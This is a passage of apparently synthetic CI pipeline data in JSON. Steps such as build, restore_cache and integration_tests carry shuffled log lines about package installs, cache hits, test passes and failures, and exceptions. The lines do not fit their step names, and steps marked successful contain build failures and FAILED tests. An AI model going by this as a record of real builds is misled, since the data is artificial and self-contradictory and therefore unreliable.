          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_auth_login (361ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing eslint@2.2.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 6/10: Building",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "Cache hit for key-1051",
          "Installing jest@2.0.0",
          "\u2713 build completed",
          "Installing webpack@1.20.0",
          "  PASS: test_cache_hit (234ms)",
          "[12:00:19] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_api_health (298ms)",
          "Step 5/10: Building",
          "\u2717 build failed with exit code 57",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-7985",
          "[12:00:19] INFO: Processing request",
          "Installing react@2.13.0",
          "[12:00:19] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing lodash@4.13.0",
          "  PASS: test_api_health (398ms)",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Cache hit for key-2612",
          "Installing prettier@3.17.0",
          "FAILED: test_api_health",
          "  PASS: test_db_connect (237ms)",
          "Installing express@5.14.0",
          "  PASS: test_auth_login (337ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing prettier@5.14.0",
          "Cache hit for key-8057",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-2560",
          "[12:00:19] INFO: Processing request",
          "Installing prettier@1.3.0",
          "  PASS: test_cache_hit (265ms)",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Cache hit for key-2288",
          "Installing lodash@2.5.0",
          "  PASS: test_db_connect (207ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-3526",
          "Exception: TypeError",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-3754",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/main.py...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-04T12:01:23.328972",
        "finished_at": "2025-12-04T12:01:35.219100",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Cache hit for key-6109",
          "Installing jest@4.3.0",
          "Installing express@5.4.0",
          "Step 10/10: Building",
          "  PASS: test_api_health (67ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_api_health (7ms)",
          "Cache hit for key-7063",
          "Installing lodash@5.18.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-1005",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_db_connect (164ms)",
          "Compiling src/utils.go...",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "FAILED: test_user_create",
          "\u2713 build completed",
          "  PASS: test_db_connect (288ms)",
          "Step 4/10: Building",
          "Installing axios@5.20.0",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (150ms)",
          "\u2713 test completed",
          "Cache hit for key-4290",
          "  PASS: test_cache_hit (477ms)",
          "Compiling src/utils.go...",
          "[12:00:19] WARN: Deprecated API usage",
          "  PASS: test_auth_login (278ms)",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-9979",
          "[12:00:19] WARN: Deprecated API usage",
          "  PASS: test_db_connect (237ms)",
          "Cache hit for key-1495",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-9746",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-6427",
          "Cache hit for key-9878",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 test completed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-8218",
          "\u2713 lint completed",
          "Cache hit for key-6285",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing axios@4.20.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing lodash@4.4.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (11ms)",
          "Step 9/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "Installing jest@1.8.0",
          "  PASS: test_auth_login (154ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2717 build failed with exit code 84",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "  PASS: test_api_health (200ms)",
          "  PASS: test_db_connect (253ms)",
          "  PASS: test_cache_hit (62ms)",
          "Step 6/10: Building",
          "Cache hit for key-4094",
          "Installing eslint@5.7.0",
          "Cache hit for key-4785",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "Cache hit for key-6800",
          "Compiling src/service.java...",
          "Cache hit for key-3089",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 7/10: Building",
          "  PASS: test_db_connect (27ms)",
          "Cache hit for key-2751",
          "Compiling src/index.js...",
          "Cache hit for key-2053",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-7843",
          "Cache hit for key-9481",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Installing axios@1.17.0",
          "\u2713 build completed",
          "Cache hit for key-9819",
          "Step 3/10: Building",
          "Cache hit for key-7309",
          "Step 6/10: Building",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_db_connect (58ms)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-4284",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (195ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-6149",
          "  PASS: test_db_connect (414ms)",
          "Cache hit for key-7469",
          "\u2713 build completed",
          "Cache hit for key-9112",
          "Cache hit for key-2469",
          "Step 3/10: Building",
          "Cache hit for key-3920",
          "Compiling src/main.py...",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-1457",
          "Installing prettier@3.12.0",
          "  PASS: test_user_create (422ms)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_auth_login (458ms)",
          "Installing eslint@4.13.0",
          "\u2713 test completed",
          "Installing prettier@2.7.0",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (37ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (80ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1243",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "\u2713 build completed",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-04T12:01:35.219100",
        "finished_at": "2025-12-04T12:02:10.889485",
        "log_lines": [
          "=== Step: build ===",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "Compiling src/index.js...",
          "  PASS: test_api_health (189ms)",
          "Step 3/10: Building",
          "Installing express@2.4.0",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5275",
          "Compiling src/main.py...",
          "Installing lodash@2.10.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-1515",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
          "Step 1/10: Building",
          "Compiling src/main.py...",
          "Installing express@5.9.0",
          "Step 6/10: Building",
          "Step 6/10: Building",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Installing webpack@3.19.0",
          "\u2713 lint completed",
          "  PASS: test_api_health (329ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (40ms)",
          "Cache hit for key-2705",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Cache hit for key-5645",
          "\u2713 build completed",
          "Installing prettier@3.7.0",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (177ms)",
          "  PASS: test_user_create (382ms)",
          "Installing eslint@1.16.0",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing webpack@2.4.0",
          "Cache hit for key-6872",
          "Installing webpack@1.8.0",
          "Step 6/10: Building",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_db_connect (188ms)",
          "Installing jest@4.20.0",
          "Installing axios@5.5.0",
          "Cache hit for key-6271",
          "Installing jest@5.12.0",
          "WARNING: react has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (278ms)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2619",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Installing lodash@4.15.0",
          "  PASS: test_auth_login (127ms)",
          "Installing webpack@5.0.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 build completed",
          "Cache hit for key-3938",
          "Installing lodash@5.9.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-7777",
          "Installing react@3.19.0",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (230ms)",
          "  PASS: test_db_connect (97ms)",
          "Cache hit for key-6108",
          "Compiling src/utils.go...",
          "Exception: TypeError",
          "\u2713 build completed",
          "  PASS: test_user_create (125ms)",
          "Compiling src/main.py...",
          "Cache hit for key-1369",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_api_health (369ms)",
          "  PASS: test_user_create (472ms)",
          "Cache hit for key-6096",
          "  PASS: test_cache_hit (397ms)",
          "Step 1/10: Building",
          "Cache hit for key-7647",
          "Cache hit for key-2347",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Installing jest@3.1.0",
          "\u2713 test completed",
          "Installing webpack@1.14.0",
          "Step 8/10: Building",
          "Cache hit for key-9881",
          "[12:00:19] INFO: Processing request",
          "Step 4/10: Building",
          "Exception: RuntimeError",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Installing jest@3.17.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/app.ts...",
          "Installing express@2.0.0",
          "Installing express@3.9.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 92",
          "Exception: RuntimeError",
          "  PASS: test_db_connect (282ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_db_connect (470ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:19] ERROR: Connection failed",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Step 5/10: Building",
          "Installing webpack@4.5.0",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-04T12:02:10.889485",
        "finished_at": "2025-12-04T12:02:18.023562",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 8/10: Building",
          "Installing lodash@4.8.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-3537",
          "Installing eslint@5.14.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5722",
          "Compiling src/main.py...",
          "Cache hit for key-6303",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing jest@5.11.0",
          "  PASS: test_api_health (484ms)",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (465ms)",
          "  PASS: test_user_create (40ms)",
          "  PASS: test_api_health (477ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1618",
          "  PASS: test_db_connect (118ms)",
          "Installing eslint@3.9.0",
          "Step 7/10: Building",
          "Cache hit for key-5872",
          "Cache hit for key-8138",
          "Compiling src/main.py...",
          "Cache hit for key-1722",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-6955",
          "Installing jest@4.20.0",
          "Step 9/10: Building",
          "  PASS: test_api_health (496ms)",
          "Installing lodash@5.3.0",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_db_connect (279ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (463ms)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "FAILED: test_cache_hit",
          "  PASS: test_cache_hit (216ms)",
          "Step 5/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing jest@5.6.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "[12:00:19] ERROR: Connection failed",
          "Cache hit for key-1106",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-2032",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "Cache hit for key-2059",
          "FAILED: test_cache_hit",
          "Installing axios@2.5.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_user_create (399ms)",
          "Step 7/10: Building",
          "Installing webpack@4.14.0",
          "Installing eslint@5.7.0",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/main.py...",
          "Cache hit for key-4324",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_user_create (39ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (380ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_db_connect (222ms)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing prettier@5.0.0",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-6647",
          "\u2713 lint completed",
          "Installing express@2.5.0",
          "[12:00:19] ERROR: Connection failed",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-6104",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "WARNING: react has known vulnerabilities",
          "Installing express@2.3.0",
          "Installing webpack@5.19.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (385ms)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "\u2713 build completed",
          "Installing lodash@5.14.0",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-1782",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "FAILED: test_db_connect",
          "Installing webpack@2.18.0",
          "Installing prettier@3.18.0",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Installing express@5.3.0",
          "  PASS: test_db_connect (7ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:02:18.023562",
        "finished_at": "2025-12-04T12:02:29.913690",
        "log_lines": [
          "=== Step: type_check ===",
          "  PASS: test_api_health (257ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-4092",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Step 3/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-8655",
          "Installing axios@1.17.0",
          "  PASS: test_api_health (182ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (404ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 lint completed",
          "Installing prettier@3.12.0",
          "WARNING: express has known vulnerabilities",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Cache hit for key-7417",
          "\u2713 lint completed",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-3432",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (438ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 6/10: Building",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Cache hit for key-7638",
          "  PASS: test_user_create (456ms)",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing express@1.19.0",
          "Installing prettier@4.0.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 1/10: Building",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-7776",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2420",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (210ms)",
          "Cache hit for key-9013",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Exception: NullPointerException",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 test completed",
          "Cache hit for key-5601",
          "Step 9/10: Building",
          "  PASS: test_db_connect (111ms)",
          "Cache hit for key-6713",
          "  PASS: test_api_health (405ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (105ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing eslint@1.6.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/index.js...",
          "Installing express@2.17.0",
          "Cache hit for key-1282",
          "Cache hit for key-7995",
          "Compiling src/app.ts...",
          "Installing lodash@1.0.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:19] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing express@1.13.0",
          "  PASS: test_db_connect (136ms)",
          "Installing lodash@3.18.0",
          "\u2713 lint completed",
          "Installing react@1.12.0",
          "[12:00:19] INFO: Processing request",
          "Installing react@5.1.0",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (101ms)",
          "Step 2/10: Building",
          "  PASS: test_auth_login (203ms)",
          "Step 8/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-4568",
          "Installing webpack@5.5.0",
          "Installing jest@5.10.0",
          "Cache hit for key-8441",
          "Cache hit for key-5803",
          "  PASS: test_cache_hit (194ms)",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-6760",
          "Step 6/10: Building",
          "  PASS: test_db_connect (151ms)",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (366ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (473ms)",
          "Cache hit for key-9788",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@5.11.0",
          "Cache hit for key-9655",
          "Installing webpack@3.18.0",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (147ms)",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-04T12:02:29.913690",
        "finished_at": "2025-12-04T12:02:41.803818",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Compiling src/index.js...",
          "Installing jest@1.15.0",
          "Installing webpack@5.5.0",
          "Cache hit for key-2454",
          "Cache hit for key-8621",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-3562",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-5798",
          "Installing react@5.14.0",
          "\u2713 test completed",
          "Installing prettier@2.1.0",
          "  PASS: test_cache_hit (290ms)",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 99",
          "Installing webpack@4.4.0",
          "  PASS: test_api_health (337ms)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:19] INFO: Processing request",
          "Installing jest@4.18.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-7031",
          "Compiling src/handler.rs...",
          "Installing axios@1.2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:19] ERROR: Connection failed",
          "Installing eslint@2.11.0",
          "Cache hit for key-9614",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Installing lodash@3.8.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-9343",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing react@4.14.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/handler.rs...",
          "Installing jest@1.1.0",
          "Installing webpack@4.17.0",
          "  PASS: test_user_create (379ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/service.java...",
          "[12:00:19] ERROR: Connection failed",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 9/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "Installing eslint@4.15.0",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_user_create (202ms)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1283",
          "Installing jest@5.9.0",
          "  PASS: test_api_health (341ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (276ms)",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_user_create (246ms)",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_api_health (196ms)",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Exception: TypeError",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (168ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "  PASS: test_user_create (490ms)",
          "Compiling src/utils.go...",
          "[12:00:19] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_db_connect (169ms)",
          "  PASS: test_user_create (137ms)",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Installing eslint@4.6.0",
          "Installing express@4.2.0",
          "  PASS: test_user_create (74ms)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-7241",
          "  PASS: test_api_health (170ms)",
          "Cache hit for key-8668",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (84ms)",
          "FAILED: test_auth_login",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-7506",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (438ms)",
          "Installing eslint@5.15.0",
          "Step 3/10: Building",
          "Installing webpack@2.18.0",
          "Cache hit for key-6943",
          "\u2713 lint completed",
          "Exception: RuntimeError",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (407ms)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing jest@2.13.0",
          "Compiling src/main.py...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:02:41.803818",
        "finished_at": "2025-12-04T12:03:05.584075",
        "log_lines": [
          "=== Step: integration_tests ===",
          "  PASS: test_api_health (137ms)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 94",
          "Installing prettier@5.15.0",
          "Cache hit for key-8674",
          "  PASS: test_db_connect (11ms)",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "  PASS: test_db_connect (120ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
